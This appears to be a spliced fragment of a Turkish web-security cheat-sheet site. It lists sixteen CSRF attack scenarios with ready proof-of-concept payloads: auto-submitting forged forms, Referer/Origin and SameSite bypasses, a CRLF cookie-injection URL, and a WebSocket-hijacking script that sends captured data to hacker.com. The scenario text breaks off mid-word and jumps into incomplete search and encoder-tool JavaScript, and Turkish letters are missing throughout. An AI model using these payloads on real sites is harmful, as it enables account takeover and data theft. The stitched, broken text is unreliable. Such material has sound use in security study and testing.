          {
            "title": "rnek CSRF Senaryolar",
            "content": "<ul style='list-style:none;padding:0;margin:0;display:grid;gap:8px'>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 1 - Temel Token Eksiklii (POST)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu, kritik bir POST isteinde CSRF token kontrol yapmyor.<br><div style='margin-top:10px;'><strong>Orijinal stek:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>POST /user/change_email HTTP/1.1\nCookie: session=abc...\n\nemail=hacker@mail.com&csrf_token=XXX</pre></div><strong style='margin-top:10px;display:block;'>PoC (Saldr) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n &lt;body onload=\"document.forms[0].submit()\"&gt;\n  &lt;form action=\"https://victim.com/user/change_email\" method=\"POST\"&gt;\n   &lt;input type=\"hidden\" name=\"email\" value=\"hacker@mail.com\" /&gt;\n   &lt;!-- Token KALDIRILDI --&gt;\n  &lt;/form&gt;\n &lt;/body&gt;\n&lt;/html&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 2 - Token Kstlamas Yok</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu, gnderilen tokenn oturum erezi ile ilikilendirilip ilikilendirilmediini (yani tokenn kurbana ait olup olmadn) kontrol etmiyor.<br><div style='margin-top:10px;'><strong>Saldr Admlar:</strong><br>1. Saldrgan, kendi hesabna giri yapar ve kendi <code>csrf_token</code> deerini kaydeder. (rn: <code>hacker_token</code>)<br>2. Saldrgan, bu <code>hacker_token</code> deerini kurban hedef alan PoC formuna yerletirir.</div><strong style='margin-top:10px;display:block;'>PoC (Saldr) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n &lt;body onload=\"document.forms[0].submit()\"&gt;\n  &lt;form action=\"https://victim.com/change_pass\" method=\"POST\"&gt;\n   &lt;input type=\"hidden\" name=\"new_password\" value=\"hacked123\" /&gt;\n   &lt;!-- Token olarak saldrgann token kullanlyor --&gt;\n   &lt;input type=\"hidden\" name=\"csrf_token\" value=\"hacker_token\" /&gt;\n  &lt;/form&gt;\n &lt;/body&gt;\n&lt;/html&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 3 - Referer Balk Kontrol Bypass</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu <code>Referer</code> balnda sadece ana domainin (<code>victim.com</code>) geip gemediini kontrol ediyor, subdomainleri dikkate almyor.<br><div style='margin-top:10px;'><strong>Saldrgan Yntemi:</strong> <code>https://victim.com.hacker.com/exploit.html</code> veya <code>https://hacker.com/exploit.html?referrer=https://victim.com</code> gibi teknikler denenir.<br>Bu rnekte, <code>.victim.com</code> tekniini kullanalm. Saldrgan, <code>victim.com</code> ile biten bir subdomain oluturur: <code>https://hacker-site.victim.com/poc.html</code></div><strong style='margin-top:10px;display:block;'>PoC (Saldr) Adresi:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>https://hacker-site.victim.com/poc.html</pre><strong style='margin-top:10px;display:block;'>Sonu:</strong><div style='margin-top:5px;'>Sunucu <code>Referer</code> balna bakar ve <code>hacker-site.victim.com</code> adresini <code>victim.com</code>'a ait olarak yanl yorumlayabilir.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 4 - Zafiyetli Metot Kullanm (GET ile Hesap Silme)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Kritik bir 'state-changing' ilem (hesap silme) iin <code>POST</code> yerine <code>GET</code> metodu kullanlyor. Bu, bir <code>&lt;img&gt;</code> veya <code>&lt;a&gt;</code> etiketi ile smrlebilir.<br><div style='margin-top:10px;'><strong>Orijinal stek:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>GET /user/delete?id=123&confirm=true HTTP/1.1\nCookie: session=abc...</pre></div><strong style='margin-top:10px;display:block;'>PoC (Saldr) Kodu (En Basit Yntem):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;img src=\"https://victim.com/user/delete?id=123&confirm=true\" style=\"display:none\"&gt;</pre><strong style='margin-top:10px;display:block;'>Aklama:</strong><div style='margin-top:5px;'>Kurbann taraycs, resmi yklemeye alrken oturum erezlerini de gndererek hesap silme isteini tetikler.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 5 - JSON CSRF (text/plain Yntemi)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> API, <code>application/json</code> yerine <code>text/plain</code> olarak gnderilen JSON verilerini kabul ediyor ve <code>X-Requested-With</code> kontrol yok.<br><div style='margin-top:10px;'><strong>Orijinal stek (JSON):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>POST /api/settings HTTP/1.1\nContent-Type: application/json\n\n{\"username\":\"new_name\"}</pre></div><strong style='margin-top:10px;display:block;'>PoC (Saldr) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;form action=\"https://victim.com/api/settings\" method=\"POST\" enctype=\"text/plain\"&gt;\n &lt;input type=\"hidden\" name='{\"username\":\"hacked\"}' value='\"}' /&gt;\n &lt;!-- Tarayc payload' u ekilde kodlar: {'username':'hacked'}='}' --&gt;\n&lt;/form&gt;</pre><strong style='margin-top:10px;display:block;'>Aklama:</strong><div style='margin-top:5px;'>Sunucu eer akllca ayrtrma yapmazsa, form verisini, geerli bir JSON payload' olarak yorumlayabilir.</div></div></details></li>\n\n<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 6 - Double Submit Cookie CSRF Bypass</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Uygulama, istein gvdesindeki/balndaki token ile erezdeki token eletirir. Ancak token tekrar oluturma (set etme) fonksiyonu zafiyetlidir.<br><div style='margin-top:10px;'><strong>Saldr Admlar:</strong><br>1. Saldrgan, kendi CSRF tokenn erez olarak kurbana enjekte eder (rn: XSS, XSS olmayan bir domainde zafiyetli bir erez koyma, vb.).<br>2. Saldrgan, bu enjekte ettii token deerini (rn: <code>hacker_cookie_token</code>) PoC formuna koyar.</div><strong style='margin-top:10px;display:block;'>PoC (Saldr) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n &lt;!-- Daha nce XSS ile 'csrf_token' erezi enjekte edilmi varsaylr --&gt;\n &lt;body onload=\"document.forms[0].submit()\"&gt;\n  &lt;form action=\"https://victim.com/update_info\" method=\"POST\"&gt;\n   &lt;input type=\"hidden\" name=\"data\" value=\"hacked_data\" /&gt;\n   &lt;!-- Formdaki token, erezdeki enjekte edilen token ile eleir --&gt;\n   &lt;input type=\"hidden\" name=\"csrf_token\" value=\"hacker_cookie_token\" /&gt;\n  &lt;/form&gt;\n &lt;/body&gt;\n&lt;/html&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 7 - Origin Kontrol Bypass (Null Byte veya Port Kullanm)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu <code>Origin</code> baln regex ile kontrol ederken sonundaki port numarasn veya dizenin sonunu tam olarak kontrol etmez.<br><div style='margin-top:10px;'><strong>Saldr Yntemleri:</strong><br>1. Port Bypass: Saldrgan, <code>https://victim.com:8080.hacker.com</code> gibi bir URL kullanr. (ou tarayc <code>Origin</code>'i sadece <code>https://victim.com</code> olarak gnderir, ancak baz sunucular yanl kontrol edebilir.)<br>2. Bo Byte: <code>Referer</code> veya <code>Origin</code> balna Null Byte (<code>%00</code>) eklenerek regex kontrolnn yanl sonu vermesi salanr.</div><strong style='margin-top:10px;display:block;'>PoC (Saldr) stei (Bo Byte rnei):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>POST /admin/action HTTP/1.1\nOrigin: https://victim.com%00.hacker.com</pre><strong style='margin-top:10px;display:block;'>Aklama:</strong><div style='margin-top:5px;'>Sunucunun regex'i <code>victim.com</code>'dan sonraki ksm kontrol etmezse veya <code>%00</code>'da keserse bypass gerekleir.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 8 - Gvenli Olmayan HTML Tag'leri ile GET CSRF</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Kritik ilem <code>GET</code> metoduyla yaplyor ve <code>Referer</code>/<code>Origin</code> kontrol yok. <br><div style='margin-top:10px;'><strong>PoC in Kullanlabilecek Dier Tag'ler:</strong><br>1. &lt;script src='...'&gt;: (API'lerde, yant tipi JS ise ve side-effect yaratyorsa kullanlr.)<br>2. &lt;link href='...'&gt;: (Baz tarayclar tarafndan prefetch/prerender amacyla tetiklenebilir.)<br>3. &lt;iframe src='...'&gt;: (Eski tarayclarda veya zel konfigrasyonlarda tetiklenebilir.)</div><strong style='margin-top:10px;display:block;'>PoC (Saldr) Kodu (AJAX/Fetch Kullanm):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n// API erezleri ile kimlik dorulamas yapyorsa ve CORS yanl ayarlanmsa alr\nfetch('https://victim.com/api/delete_user?id=123', {\n method: 'GET',\n mode: 'cors',\n credentials: 'include' \n});\n&lt;/script&gt;</pre><strong style='margin-top:10px;display:block;'>Aklama:</strong><div style='margin-top:5px;'>Eer API, CORS ayarlarn <code>Access-Control-Allow-Credentials: true</code> ve <code>Access-Control-Allow-Origin: *</code> olarak ayarlamsa<br>(bkz: 4. Blm, CORS CSRF), bu senaryo, klasik CSRF korumalarn atlayarak dorudan kurbann oturumuyla XHR istei gnderir.</div></div></details></li>\n\n<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 9 - Login CSRF (Oturum Bindirme)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> <code>/login</code> endpoint'inde CSRF korumas yoktur. Saldrgan, kurban <em>kendi (saldrgann)</em> hesabna giri yapmaya zorlar.<br><div style='margin-top:10px;'><strong>Neden Tehlikeli?</strong><ul style='padding-left:20px;margin:5px 0;'><li>Kurban, siteye girdiini sanr ama aslnda saldrgann hesabndadr.</li><li>Kurbann girdii kredi kart bilgileri, arama gemii veya ykledii dosyalar saldrgann hesabna kaydedilir.</li></ul></div><strong style='margin-top:10px;display:block;'>PoC (Saldr) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n &lt;body onload=\"document.forms[0].submit()\"&gt;\n  &lt;form action=\"https://victim.com/login\" method=\"POST\"&gt;\n   &lt;input type=\"hidden\" name=\"user\" value=\"hacker\" /&gt;\n   &lt;input type=\"hidden\" name=\"pass\" value=\"hacker123\" /&gt;\n  &lt;/form&gt;\n &lt;/body&gt;\n&lt;/html&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 10 - Referer \"Fail Open\" (Meta Tag Trick)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sistem, Referer bal <em>varsa</em> domaini kontroll eder, ancak Referer bal <em>hi yoksa</em> (null/empty) istee gvenip izin verir (Fail Open).<br><div style='margin-top:10px;'><strong>Saldr Yntemi:</strong> Saldrgan, PoC sayfasna bir <code>meta</code> etiketi ekleyerek taraycnn Referer bal gndermesini engeller.</div><strong style='margin-top:10px;display:block;'>PoC (Saldr) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n &lt;head&gt;\n  &lt;!-- Bu meta tag, taraycnn Referer baln silmesini salar --&gt;\n  &lt;meta name=\"referrer\" content=\"no-referrer\"&gt;\n &lt;/head&gt;\n &lt;body onload=\"document.forms[0].submit()\"&gt;\n  &lt;form action=\"https://victim.com/delete_account\" method=\"POST\"&gt;\n   &lt;!-- Parametreler --&gt;\n  &lt;/form&gt;\n &lt;/body&gt;\n&lt;/html&gt;</pre><strong style='margin-top:10px;display:block;'>Sonu:</strong><div style='margin-top:5px;'>Sunucu \"Referer bal yok, demek ki gvenli (rnein bookmark'tan gelmi)\" diye dnr ve saldry kabul eder.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 11 - SameSite Strict Bypass (On-Site Redirect Gadget Zinciri)</summary><div style='margin-top:10px;'><strong>nemli n Koul:</strong> Hedef endpoint'te CSRF Token korumas olmamas ve sitede maniple edilebilir bir JS ynlendirme (Open Redirect/Gadget) bulunmas gerekir.<br><strong>Zafiyet Mant:</strong> erezler <code>SameSite=Strict</code> olsa bile, tarayclar 'Site i' (on-site) ynlendirmelerde bu kstlamay uygulamaz. Saldrgan, kurban nce siteye erezsiz gnderir, ardndan sitenin kendi JS kodu kurban erezli ekilde hedef endpoint'e ynlendirir.<br><strong style='margin-top:10px;display:block;'>PoC (Saldr) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n document.location = \"https://victim.com/post/confirmation?postId=1/../../my-account/change-email?email=hacked@mail.com%26submit=1\";\n&lt;/script&gt;</pre><strong>Not:</strong> URL iindeki <code>&</code> karakteri <code>%26</code> olarak encode edilmelidir.</div></details></li><li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 12 - Token Tied to Non-Session Cookie (Cookie Injection)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> CSRF token session erezine deil, <code>csrfKey</code> gibi baka bir ereze baldr ve bu erez session'dan bamszdr.<br><div style='margin-top:10px;'><strong>Saldr Admlar:</strong><br>1. Sitede erez enjekte edebileceiniz bir ak bulun (rn: Search ksmnda CRLF/Header Injection).<br>2. Kurbana kendi <code>csrfKey</code> erezinizi set ettirin: <code>/?search=test%0d%0aSet-Cookie:csrfKey=HACKER_KEY;%20SameSite=None</code><br>3. Form iinde ise bu erezle eleen kendi <code>csrf_token</code> deerinizi gnderin.</div><strong style='margin-top:10px;display:block;'>PoC (Saldr) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;img src=\"https://victim.com/?search=x%0d%0aSet-Cookie:csrfKey=HACKER_KEY\" onerror=\"document.forms[0].submit()\"&gt;\n&lt;form action=\"https://victim.com/change-email\" method=\"POST\"&gt;\n &lt;input type=\"hidden\" name=\"email\" value=\"hacker@mail.com\" /&gt;\n &lt;input type=\"hidden\" name=\"csrf\" value=\"HACKER_TOKEN\" /&gt;\n&lt;/form&gt;</pre></div></details></li><li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 13 - SameSite Lax Bypass (Method Override)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> erezler <code>SameSite=Lax</code> (varsaylan) korumasndadr. Lax, POST isteklerinde erez gndermez ama GET isteklerinde (top-level navigation ile) gnderir.<br><div style='margin-top:10px;'><strong>Saldr Mant:</strong> Sunucu <code>_method=POST</code> gibi bir parametre ile metodun zerine yazlmasna (override) izin veriyorsa, istek <code>GET</code> olarak atlp Lax duvar alr, sunucu ise bunu <code>POST</code> gibi iler.</div><strong style='margin-top:10px;display:block;'>PoC (Saldr) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n document.location = \"https://victim.com/change-email?email=hacked@mail.com&_method=POST\";\n&lt;/script&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 14 - SameSite Strict Bypass (Sibling Domain & CSWSH)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Ana domain Strict erezle korunsa da, ayn site saylan bir subdomaindeki (sibling domain) XSS zerinden WebSocket balants balatlabilir.<br><strong>Saldr Zinciri:</strong><br>1. Sibling domainde (rn: <code>cms.victim.com</code>) bir XSS bulunur.<br>2. Tarayc bu subdomainden gelen istei 'Same-Site' sayd iin <code>Strict</code> erezini ekler.<br><strong style='margin-top:10px;display:block;'>PoC (XSS Payload):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n  var ws = new WebSocket('wss://victim.com/chat');\n  ws.onopen = function() { ws.send(\"READY\"); };\n  ws.onmessage = function(event) {\n    fetch('https://hacker.com/log', {method:'POST', body:event.data, mode:'no-cors'});\n  };\n&lt;/script&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 15 - SameSite Lax Bypass (Cookie Refresh & Popup)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Chrome'un 'Lax-allowing-unsafe' kural (erez set edildikten sonraki ilk 2 dakika boyunca cross-site POST'a izin verilmesi).<br><strong>Saldr Yntemi:</strong><br>1. Kurbann tklamasyla popup alr (social-login).<br>2. erez tazelenir ve 2 dakikalk istisna penceresi balar.<br><strong style='margin-top:10px;display:block;'>PoC Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>window.onclick = () => {\n  window.open('https://victim.com/social-login');\n  setTimeout(() => { document.forms[0].submit(); }, 5000);\n}</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 16 - Referer Validation (Fail-Open Policy)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu Referer bal varsa kontrol ediyor ama balk yoksa (baz proxy/bookmark durumlar iin) istei kabul ediyor.<br><div style='margin-top:10px;'><strong>Bypass Yntemi:</strong> HTML iine zel bir meta tag ekleyerek taraycnn Referer gndermesi engellenir.</div><strong style='margin-top:10px;display:block;'>PoC Ko                 const query = e.target.value.trim().toLowerCase();
                suggestionsDiv.innerHTML = '';
                suggestionsDiv.classList.remove('visible');
                selectedIndex = -1;
                if (query === '') return;
                
                Object.keys(CONTENT).forEach(key => {
                    if (key === 'home') return;
                    const item = CONTENT[key];
                    const searchText = `${item.menuName || ''} ${item.title || ''} ${item.description || ''}`.toLowerCase();
                    let sectionMatches = '';
                    if (item.sections) {
                        item.sections.forEach(sec => {
                            const secText = `${sec.title || ''}`.toLowerCase();
                            if (secText.includes(query)) sectionMatches += ` - ${sec.title}`;
                        });
                    }
                    if (searchText.includes(query) || sectionMatches) {
                        const suggestion = document.createElement('div');
                        suggestion.classList.add('search-suggestion');
                        suggestion.dataset.page = key;
                        suggestion.innerHTML = `${item.menuName || item.title}${sectionMatches}`;

                if (suggestionsDiv.children.length > 0) suggestionsDiv.classList.add('visible');

            const keyHandler = function (e) {
                const suggestions = suggestionsDiv.querySelectorAll('.search-suggestion');
                if (suggestions.length === 0) return;
                if (e.key === 'ArrowDown') selectedIndex = (selectedIndex + 1) % suggestions.length;
                else if (e.key === 'ArrowUp') selectedIndex = (selectedIndex - 1 + suggestions.length) % suggestions.length;
                else if (e.key === 'Enter' && selectedIndex >= 0) { suggestions[selectedIndex].click(); }
                else if (e.key === 'Escape') { 
                    searchInput.value = '';
                    suggestionsDiv.innerHTML = '';
                    suggestionsDiv.classList.remove('visible');
                    selectedIndex = -1;
                }
                suggestions.forEach((sug, idx) => sug.classList.toggle('highlight', idx === selectedIndex));
            };

            const suggestionClickHandler = function (e) {
                const targetSuggestion = e.target.closest('.search-suggestion');
                if (targetSuggestion) {
                    showPage(targetSuggestion.dataset.page);
                    searchInput.value = '';
                    suggestionsDiv.innerHTML = '';
                    suggestionsDiv.classList.remove('visible');
                    selectedIndex = -1;
                }
            };

            searchInput.addEventListener('input', searchHandler);

    function activateEncoderDecoder() {
      const tabButtons = document.querySelectorAll('.tab-button');
      const tabContents = document.querySelectorAll('.tab-content');

      tabButtons.forEach(button => {
        button.addEventListener('click', () => {
          tabButtons.forEach(btn => btn.classList.remove('active'));
          tabContents.forEach(content => content.classList.remove('active'));
          button.classList.add('active');
          document.getElementById(button.dataset.tab).classList.add('active');
        });
      });

      const identifierInput = document.getElementById('identifierInput');
      const identifierOutput = document.getElementById('identifierOutput');
      if (identifierInput) {
        identifierInput.addEventListener('input', () => {
          const value = identifierInput.value.trim();
          identifierOutput.classList.remove('found');

          if (value === '') {
            identifierOutput.textContent = 'Olas formatlar burada grnecek...';
            return;
          }

          let results = [];
          if (/^[a-f0-9]{32}$/i.test(value)) results.push('MD5 Hash');
          if (/^[a-f0-9]{40}$/i.test(value)) results.push('SHA1 Hash');
          if (/^[a-f0-9]{64}$/i.test(value)) results.push('SHA256 Hash');
          if (/^[a-f0-9]{128}$/i.test(value)) results.push('SHA512 Hash');
          if (/^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/.test(value) && value.length % 4 === 0) {
            results.push('Base64');
          }
          if (/^([0-9a-fA-F]{2})+$/.test(value)) results.push('Hex');
          if (/%[0-9a-fA-F]{2}/.test(value)) results.push('URL Encoded');
          if (/&#?[a-zA-Z0-9]+;/.test(value)) results.push('HTML Entity');
          if (value.split('.').length === 3 && value.includes('ey')) results.push('JWT (Olas)');

          if (results.length > 0) {
            identifierOutput.innerHTML = `Olas Format(lar): <strong>${results.join(', ')}</strong>`;
            identifierOutput.classList.add('found');
          } else {
            identifierOutput.textContent = 'Format tespit edilemedi.';
          }
        });
      }

      const stringToHex = str => str.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
      const hexToString = hex => {
        let str = '';
        for (let i = 0; i < hex.length; i += 2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
        return str;
      };
      const encodeHtmlEntities = str => {
        const temp = document.createElement('div');
        temp.textContent = str;
        return temp.innerHTML;
      };
      const decodeHtmlEntities = str => {
        const temp = document.createElement('textarea');
        temp.innerHTML = str;
        return temp.value;
      };

      const setupListener = (id, action) => {
        const button = document.getElementById(id);
        if (button) button.addEventListener('click', action);
      };
      const encodeInput = document.getElementById('encodeInput');
      const encodeOutput = document.getElementById('encodeOutput');
      const decodeInput = document.getElementById('decodeInput');
      const decodeOutput = document.getElementById('decodeOutput');

      setupListener('btnB64Encode', () => { encodeOutput.value = btoa(encodeInput.value); });
      setupListener('btnUrlEncode', () => { encodeOutput.value = encodeURIComponent(encodeInput.value); });
      setupListener('btnHexEncode', () => { encodeOutput.value = stringToHex(encodeInput.value); });
      setupListener('btnHtmlEncode', () => { encodeOutput.value = encodeHtmlEntities(encodeInput.value); });
      setupListener('btnMd5', () => { encodeOutput.value = CryptoJS.MD5(encodeInput.value).toString(); });
      setupListener('btnSha1', () => { encodeOutput.value = CryptoJS.SHA1(encodeInput.value).toString(); });
      setupListener('btnSha256', () => { encodeOutput.value = CryptoJS.SHA256(encodeInput.value).toString(); });
      setupListener('btnCopyEncodeOutput', () => {
        navigator.clipboard.writeText(encodeOutput.value);
        document.getElementById('btnCopyEncodeOutput').textContent = 'Kopyaland!';
        setTimeout(() => { document.getElementById('btnCopyEncodeOutput').textContent = 'kty Kopyala'; }, 1500);
      });

      setupListener('btnB64Decode', () => { try { decodeOutput.value = atob(decodeInput.value); } catch (e) { decodeOutput.value = 'Hata: Geersiz Base64 dizesi.'; } });
      setupListener('btnUrlDecode', () => { try { decodeOutput.value = decodeURIComponent(decodeInput.value); } catch (e) { decodeOutput.value = 'Hata: Geersiz URL format.'; } });
      setupListener('btnHexDecode', () => { try { decodeOutput.value = hexToString(decodeInput.value); } catch (e) { decodeOutput.value = 'Hata: Geersiz Hex dizesi.'; } });
      setupListener('btnHtmlDecode', () => { decodeOutput.value = decodeHtmlEntities(decodeInput.value); });
      setupListener('btnCopyDecodeOutput', () => {
        navigator.clipboard.writeText(decodeOutput.value);
        document.getElementById('btnCopyDecodeOutput').textContent = 'Kopyaland!';
        setTimeout(() => { document.getElementById('btnCopyDecodeOutput').textContent = 'kty Kopyala'; }, 1500);
      });
    }
